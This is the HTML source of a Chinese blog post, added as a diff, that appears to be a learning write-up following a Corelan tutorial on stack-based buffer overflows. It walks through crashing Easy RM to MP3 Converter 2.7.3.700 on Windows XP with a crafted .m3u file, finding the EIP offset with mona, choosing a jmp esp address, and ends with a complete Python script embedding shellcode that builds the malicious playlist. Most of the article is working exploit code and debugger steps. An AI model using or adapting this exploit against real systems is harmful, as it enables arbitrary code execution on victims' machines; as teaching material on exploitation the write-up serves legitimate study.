@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>exploit编写教程1：基于栈的溢出 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出,exploit 编写," />
+  
+
+  <meta name="description" content="一直都想系统学习exploit编写，最近找到个不错的网站Corelan Team,准备按照上面的教程学习，这是第一篇古老的buffer overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exploit编写教程1：基于栈的溢出">
+<meta property="og:url" content="http://huirong.github.io/2015/12/15/stack-based-overflow/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="一直都想系统学习exploit编写，最近找到个不错的网站Corelan Team,准备按照上面的教程学习，这是第一篇古老的buffer overflow">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0oss5wf7j30e5050759.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez0oyoodoej30i00dd0wn.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p2ebjfwj30e6040q3n.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p476wlpj30mm0cp0wk.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0p83itkrj30e503ymxw.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pbcdfiqj30ap0cfdhq.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1ez0pcw5iv0j30mx03uabs.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pdv48mlj30bo04cwez.jpg">
+<meta property="og:updated_time" content="2016-04-16T12:00:38.074Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="exploit编写教程1：基于栈的溢出">
+<meta name="twitter:description" content="一直都想系统学习exploit编写，最近找到个不错的网站Corelan Team,准备按照上面的教程学习，这是第一篇古老的buffer overflow">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0oss5wf7j30e5050759.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅰ、试验环境"><span class="toc-text">Ⅰ、试验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅱ、漏洞触发"><span class="toc-text">Ⅱ、漏洞触发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅲ、EIP定位"><span class="toc-text">Ⅲ、EIP定位</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅳ、寻找shellcode存放的地址空间"><span class="toc-text">Ⅳ、寻找shellcode存放的地址空间</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V、查找jmp-esp地址"><span class="toc-text">V、查找jmp esp地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅵ、构造最终的输入文件"><span class="toc-text">Ⅵ、构造最终的输入文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅶ、参考文献"><span class="toc-text">Ⅶ、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-stack-based-overflow" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">exploit编写教程1：基于栈的溢出</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2015.12.15</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/exploit-编写/">exploit 编写</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2015/12/15/stack-based-overflow/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>一直都想系统学习exploit编写，最近找到个不错的网站<a href="https://www.corelan.be/" target="_blank" rel="external">Corelan Team</a>,准备按照上面的教程学习，这是第一篇古老的buffer overflow<br><a id="more"></a></p>
+<h1 id="Ⅰ、试验环境"><a href="#Ⅰ、试验环境" class="headerlink" title="Ⅰ、试验环境"></a>Ⅰ、试验环境</h1><ul>
+<li>测试平台： Microsoft Windows XP SP3</li>
+<li>漏洞软件：Easy RM to MP3 Converter（版本2.7.3.700）</li>
+<li>分析工具：Immunity Debugger</li>
+<li>漏洞描述：通过创建一个恶意的.m3u文件将触发Easy RM to MP3 Converter (version 2.7.3.700)缓冲区溢出利用。</li>
+</ul>
+<h1 id="Ⅱ、漏洞触发"><a href="#Ⅱ、漏洞触发" class="headerlink" title="Ⅱ、漏洞触发"></a>Ⅱ、漏洞触发</h1><p>我选用Python语言编写脚本，首先构造一个30000个字符的.m3u文件，前面25000全为’A’，后5000个为’B’。<br><figure class="highlight d"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line">filename = <span class="string">"test.m3u"</span></div><div class="line">f = open(filename,<span class="string">'w'</span>)</div><div class="line">data = <span class="string">'A'</span> * <span class="number">25000</span> + <span class="string">'B'</span> * <span class="number">5000</span></div><div class="line">f.write(data)</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p>使用Easy RM to MP3 Converter加载这个crash.m3u文件，出错，信息如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0oss5wf7j30e5050759.jpg" alt=""></p>
+<p>从上图可知，溢出之后的返回地址是0x42424242，也就是’BBBB’，这说明要覆盖的EIP在25000到30000之间。下面使用Immunity的查件mona来进行精确定位。</p>
+<h1 id="Ⅲ、EIP定位"><a href="#Ⅲ、EIP定位" class="headerlink" title="Ⅲ、EIP定位"></a>Ⅲ、EIP定位</h1><p>使用Immunity Debugger -&gt; open -&gt; RM2MP3Converter.exe ，F9运行，然后点击load -&gt; test.m3u<br>回到Immunity Debugger，创建包含5000个字符的pattern<br>在命令行输入：<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="addition">!mona pattern_create 5000</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1ez0oyoodoej30i00dd0wn.jpg" alt=""></p>
+<p>从Log data中可知，pattern文件在C:\D\mona-master\output\RM2MP3Converter\pattern.txt，<br>提取出生成的5000个字符文件，放入p.txt，并替换crash.m3u中最后5000个字符。脚本如下：<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">filename</span> = <span class="string">"test_pattern.m3u"</span></div><div class="line">f = <span class="keyword">open</span>(<span class="keyword">filename</span>,<span class="string">'w'</span>)</div><div class="line">data = <span class="string">'A'</span> * <span class="number">25000</span></div><div class="line">	</div><div class="line">fp = <span class="keyword">open</span>(<span class="string">"p.txt"</span>,<span class="string">'r'</span>)</div><div class="line">data += fp.<span class="keyword">read</span>()</div><div class="line">f.write(data)</div><div class="line">f.<span class="keyword">close</span>()</div></pre></td></tr></table></figure></p>
+<p>再次打开目标软件加载test_pattern.m3u，程序崩溃：</p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p2ebjfwj30e6040q3n.jpg" alt=""></p>
+<p>此时EIP为：386b4237<br>在命令行输入：<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona pattern_offset <span class="number">386b4237</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p476wlpj30mm0cp0wk.jpg" alt=""></p>
+<p>我们看到EIP被修改的位置是25000 + 1103。<br>此时我们再用如下脚本测试一下位置是否正确：<br><figure class="highlight d"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line">filename = <span class="string">"test.m3u"</span></div><div class="line">f = open(filename,<span class="string">'w'</span>)</div><div class="line">data = <span class="string">'A'</span> * <span class="number">26103</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span>*<span class="number">100</span></div><div class="line">f.write(data)</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0p83itkrj30e503ymxw.jpg" alt=""></p>
+<p>我们可以看到，EIP现在是4个B，偏移正确，下面就是如何修改 EIP</p>
+<h1 id="Ⅳ、寻找shellcode存放的地址空间"><a href="#Ⅳ、寻找shellcode存放的地址空间" class="headerlink" title="Ⅳ、寻找shellcode存放的地址空间"></a>Ⅳ、寻找shellcode存放的地址空间</h1><p>再次使用上面.m3u文件，崩溃时，打开栈的窗口</p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pbcdfiqj30ap0cfdhq.jpg" alt=""></p>
+<p>我们看到在ESP此时为000FF730，EIP到这里还有4个字节。ESP开始用于存放shellcode。</p>
+<h1 id="V、查找jmp-esp地址"><a href="#V、查找jmp-esp地址" class="headerlink" title="V、查找jmp esp地址"></a>V、查找jmp esp地址</h1><p>再次加载目标程序，F9之后Pause，在CPU窗口，右键 Search For -&gt;All commands in All modules，在之后的窗口输入jmp esp。</p>
+<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1ez0pcw5iv0j30mx03uabs.jpg" alt=""></p>
+<p>选一个7C874413（地址随便选，没有影响）。</p>
+<h1 id="Ⅵ、构造最终的输入文件"><a href="#Ⅵ、构造最终的输入文件" class="headerlink" title="Ⅵ、构造最终的输入文件"></a>Ⅵ、构造最终的输入文件</h1><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">shellcode = ("<span class="symbol">\x</span>FC<span class="symbol">\x</span>33<span class="symbol">\x</span>D2<span class="symbol">\x</span>B2<span class="symbol">\x</span>30<span class="symbol">\x</span>64<span class="symbol">\x</span>FF<span class="symbol">\x</span>32<span class="symbol">\x</span>5A<span class="symbol">\x</span>8B"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>0C<span class="symbol">\x</span>8B<span class="symbol">\x</span>52<span class="symbol">\x</span>14<span class="symbol">\x</span>8B<span class="symbol">\x</span>72<span class="symbol">\x</span>28<span class="symbol">\x</span>33<span class="symbol">\x</span>C9"</div><div class="line">"<span class="symbol">\x</span>B1<span class="symbol">\x</span>18<span class="symbol">\x</span>33<span class="symbol">\x</span>FF<span class="symbol">\x</span>33<span class="symbol">\x</span>C0<span class="symbol">\x</span>AC<span class="symbol">\x</span>3C<span class="symbol">\x</span>61<span class="symbol">\x</span>7C"</div><div class="line">"<span class="symbol">\x</span>02<span class="symbol">\x</span>2C<span class="symbol">\x</span>20<span class="symbol">\x</span>C1<span class="symbol">\x</span>CF<span class="symbol">\x</span>0D<span class="symbol">\x</span>03<span class="symbol">\x</span>F8<span class="symbol">\x</span>E2<span class="symbol">\x</span>F0"</div><div class="line">"<span class="symbol">\x</span>81<span class="symbol">\x</span>FF<span class="symbol">\x</span>5B<span class="symbol">\x</span>BC<span class="symbol">\x</span>4A<span class="symbol">\x</span>6A<span class="symbol">\x</span>8B<span class="symbol">\x</span>5A<span class="symbol">\x</span>10<span class="symbol">\x</span>8B"</div><div class="line">"<span class="symbol">\x</span>12<span class="symbol">\x</span>75<span class="symbol">\x</span>DA<span class="symbol">\x</span>8B<span class="symbol">\x</span>53<span class="symbol">\x</span>3C<span class="symbol">\x</span>03<span class="symbol">\x</span>D3<span class="symbol">\x</span>FF<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>34<span class="symbol">\x</span>8B<span class="symbol">\x</span>52<span class="symbol">\x</span>78<span class="symbol">\x</span>03<span class="symbol">\x</span>D3<span class="symbol">\x</span>8B<span class="symbol">\x</span>72<span class="symbol">\x</span>20<span class="symbol">\x</span>03"</div><div class="line">"<span class="symbol">\x</span>F3<span class="symbol">\x</span>33<span class="symbol">\x</span>C9<span class="symbol">\x</span>41<span class="symbol">\x</span>AD<span class="symbol">\x</span>03<span class="symbol">\x</span>C3<span class="symbol">\x</span>81<span class="symbol">\x</span>38<span class="symbol">\x</span>47"</div><div class="line">"<span class="symbol">\x</span>65<span class="symbol">\x</span>74<span class="symbol">\x</span>50<span class="symbol">\x</span>75<span class="symbol">\x</span>F4<span class="symbol">\x</span>81<span class="symbol">\x</span>78<span class="symbol">\x</span>04<span class="symbol">\x</span>72<span class="symbol">\x</span>6F"</div><div class="line">"<span class="symbol">\x</span>63<span class="symbol">\x</span>41<span class="symbol">\x</span>75<span class="symbol">\x</span>EB<span class="symbol">\x</span>81<span class="symbol">\x</span>78<span class="symbol">\x</span>08<span class="symbol">\x</span>64<span class="symbol">\x</span>64<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>65<span class="symbol">\x</span>75<span class="symbol">\x</span>E2<span class="symbol">\x</span>49<span class="symbol">\x</span>8B<span class="symbol">\x</span>72<span class="symbol">\x</span>24<span class="symbol">\x</span>03<span class="symbol">\x</span>F3<span class="symbol">\x</span>66"</div><div class="line">"<span class="symbol">\x</span>8B<span class="symbol">\x</span>0C<span class="symbol">\x</span>4E<span class="symbol">\x</span>8B<span class="symbol">\x</span>72<span class="symbol">\x</span>1C<span class="symbol">\x</span>03<span class="symbol">\x</span>F3<span class="symbol">\x</span>8B<span class="symbol">\x</span>14"</div><div class="line">"<span class="symbol">\x</span>8E<span class="symbol">\x</span>03<span class="symbol">\x</span>D3<span class="symbol">\x</span>52<span class="symbol">\x</span>33<span class="symbol">\x</span>FF<span class="symbol">\x</span>57<span class="symbol">\x</span>68<span class="symbol">\x</span>61<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>79<span class="symbol">\x</span>41<span class="symbol">\x</span>68<span class="symbol">\x</span>4C<span class="symbol">\x</span>69<span class="symbol">\x</span>62<span class="symbol">\x</span>72<span class="symbol">\x</span>68<span class="symbol">\x</span>4C<span class="symbol">\x</span>6F"</div><div class="line">"<span class="symbol">\x</span>61<span class="symbol">\x</span>64<span class="symbol">\x</span>54<span class="symbol">\x</span>53<span class="symbol">\x</span>FF<span class="symbol">\x</span>D2<span class="symbol">\x</span>68<span class="symbol">\x</span>33<span class="symbol">\x</span>32<span class="symbol">\x</span>01"</div><div class="line">"<span class="symbol">\x</span>01<span class="symbol">\x</span>66<span class="symbol">\x</span>89<span class="symbol">\x</span>7C<span class="symbol">\x</span>24<span class="symbol">\x</span>02<span class="symbol">\x</span>68<span class="symbol">\x</span>75<span class="symbol">\x</span>73<span class="symbol">\x</span>65"</div><div class="line">"<span class="symbol">\x</span>72<span class="symbol">\x</span>54<span class="symbol">\x</span>FF<span class="symbol">\x</span>D0<span class="symbol">\x</span>68<span class="symbol">\x</span>6F<span class="symbol">\x</span>78<span class="symbol">\x</span>41<span class="symbol">\x</span>01<span class="symbol">\x</span>8B"</div><div class="line">"<span class="symbol">\x</span>DF<span class="symbol">\x</span>88<span class="symbol">\x</span>5C<span class="symbol">\x</span>24<span class="symbol">\x</span>03<span class="symbol">\x</span>68<span class="symbol">\x</span>61<span class="symbol">\x</span>67<span class="symbol">\x</span>65<span class="symbol">\x</span>42"</div><div class="line">"<span class="symbol">\x</span>68<span class="symbol">\x</span>4D<span class="symbol">\x</span>65<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>54<span class="symbol">\x</span>50<span class="symbol">\x</span>FF<span class="symbol">\x</span>54<span class="symbol">\x</span>24"</div><div class="line">"<span class="symbol">\x</span>2C<span class="symbol">\x</span>57<span class="symbol">\x</span>68<span class="symbol">\x</span>4F<span class="symbol">\x</span>5F<span class="symbol">\x</span>6F<span class="symbol">\x</span>21<span class="symbol">\x</span>8B<span class="symbol">\x</span>DC<span class="symbol">\x</span>57"</div><div class="line">"<span class="symbol">\x</span>53<span class="symbol">\x</span>53<span class="symbol">\x</span>57<span class="symbol">\x</span>FF<span class="symbol">\x</span>D0<span class="symbol">\x</span>68<span class="symbol">\x</span>65<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>01"</div><div class="line">"<span class="symbol">\x</span>8B<span class="symbol">\x</span>DF<span class="symbol">\x</span>88<span class="symbol">\x</span>5C<span class="symbol">\x</span>24<span class="symbol">\x</span>03<span class="symbol">\x</span>68<span class="symbol">\x</span>50<span class="symbol">\x</span>72<span class="symbol">\x</span>6F"</div><div class="line">"<span class="symbol">\x</span>63<span class="symbol">\x</span>68<span class="symbol">\x</span>45<span class="symbol">\x</span>78<span class="symbol">\x</span>69<span class="symbol">\x</span>74<span class="symbol">\x</span>54<span class="symbol">\x</span>FF<span class="symbol">\x</span>74<span class="symbol">\x</span>24"</div><div class="line">"<span class="symbol">\x</span>40<span class="symbol">\x</span>FF<span class="symbol">\x</span>54<span class="symbol">\x</span>24<span class="symbol">\x</span>40<span class="symbol">\x</span>57<span class="symbol">\x</span>FF<span class="symbol">\x</span>D0");</div><div class="line">	</div><div class="line">ret = "<span class="symbol">\x</span>7B<span class="symbol">\x</span>46<span class="symbol">\x</span>86<span class="symbol">\x</span>7C";</div><div class="line">filename = "crash.m3u"</div><div class="line">f = open(filename,'w')</div><div class="line">data = 'A' * 26103 + ret + '<span class="symbol">\x</span>90' * 4 + shellcode</div><div class="line">f.write(data)</div><div class="line">f.close()</div></pre></td></tr></table></figure>
+<p>使用Easy RM to MP3 Converter加载这个crash.m3u文件，OK，成功了！！！</p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pdv48mlj30bo04cwez.jpg" alt=""></p>
+<h1 id="Ⅶ、参考文献"><a href="#Ⅶ、参考文献" class="headerlink" title="Ⅶ、参考文献"></a>Ⅶ、参考文献</h1><p><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br><a href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/03/16/exploit-buffer-overflow/" target="_blank" rel="external">exploit编写笔记1——基于栈的溢出</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2015/12/15/stack-based-overflow/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2015/12/15/stack-based-overflow/index.html" data-title="exploit编写教程1：基于栈的溢出" data-url="http://huirong.github.io/2015/12/15/stack-based-overflow/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
